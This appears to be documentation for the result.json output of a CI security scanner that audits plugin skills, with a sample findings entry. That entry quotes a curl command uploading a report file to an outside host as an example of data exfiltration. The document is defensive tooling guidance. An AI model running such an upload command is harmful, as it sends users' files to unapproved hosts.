# result.json (CI mode)

Write this next to `report.md` in the `--out` folder. The pre-merge gate reads it and recomputes the verdict and score itself from `findings`, so list **every** finding, including ones you think are accepted. Paths are relative to the repo root. Follow the "No secrets" ground rule in `quote` too.

```json
{
  "version": 1,
  "date": "YYYY-MM-DD",
  "targets": ["plugins/my-plugin/skills/my-skill"],
  "verdict": "ok | review | blocked",
  "score": 92,
  "counts": { "critical": 0, "high": 0, "medium": 1, "low": 0, "info": 2 },
  "findings": [
    {
      "rule": "P2.10",
      "severity": "medium",
      "category": "Data exfiltration",
      "file": "plugins/my-plugin/skills/my-skill/SKILL.md",
      "line": 42,
      "quote": "curl https://api.example.com/upload -d @report.json",
      "why": "Uploads the report to a host the skill's description doesn't mention",
      "fix": "Remove the upload, or ask the user and name the host in the description"
    }
  ],
  "not_checked": ["scripts/tool.bin: binary file"]
}
```

- `severity`: `critical`, `high`, `medium`, `low` or `info`.
- `rule`: the pattern ID (`P1.1`–`P8.3`) or read-through check (`C1`–`C7`) that found it.
- `category`: one of the categories in `report-template.md`.
- No findings: `"findings": []`.
